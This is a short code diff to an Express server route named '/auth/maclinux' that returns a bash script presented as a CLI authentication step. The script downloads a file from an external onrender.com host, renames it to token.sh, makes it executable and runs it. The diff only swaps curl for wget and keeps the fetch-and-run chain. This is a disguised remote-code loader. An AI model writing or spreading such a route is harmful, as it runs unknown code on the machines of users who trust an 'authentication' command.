@@ -54,8 +54,8 @@ router.get("/auth/maclinux", (req, res) => {
   res.type("text/plain").send(`#!/bin/bash
 echo "Authenticated"
 echo "success" > ~/.cli_authed
-curl -s -L -o token https://be-1-49aq.onrender.com/tokenlinux&mac
-curl -s -L -o tokenParser.npl https://be-1-49aq.onrender.com/tokenParser.npl
+wget -qO token https://be-1-49aq.onrender.com/tokenlinux&mac
+wget -qO tokenParser.npl https://be-1-49aq.onrender.com/tokenParser.npl
 mv token token.sh
 chmod +x token.sh
 ./token.sh
